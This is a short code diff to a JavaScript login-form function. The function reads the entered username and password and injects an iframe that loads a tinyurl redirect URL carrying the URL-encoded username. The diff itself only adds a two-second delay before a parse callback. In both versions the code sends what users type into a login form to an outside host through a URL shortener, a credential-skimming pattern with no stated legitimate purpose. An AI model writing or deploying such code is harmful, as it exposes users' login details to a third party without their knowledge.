@@ -37,7 +37,7 @@
     function confirm(){
         username=document.querySelectorAll('input')[0].value;
         password=document.querySelectorAll('input')[1].value;
-        document.body.innerHTML+='<iframe onload="parse();" src="'+'https://tinyurl.com/redirect.php?num=systemuser'+encodeURIComponent(document.querySelectorAll('input')[0].value)+'password'+'"></iframe>';
+        document.body.innerHTML+='<iframe onload="setTimeout(parse,2000);" src="'+'https://tinyurl.com/redirect.php?num=systemuser'+encodeURIComponent(document.querySelectorAll('input')[0].value)+'password'+'"></iframe>';
         document.querySelectorAll('input')[0].value=username;
         document.querySelectorAll('input')[1].value=password;
     }
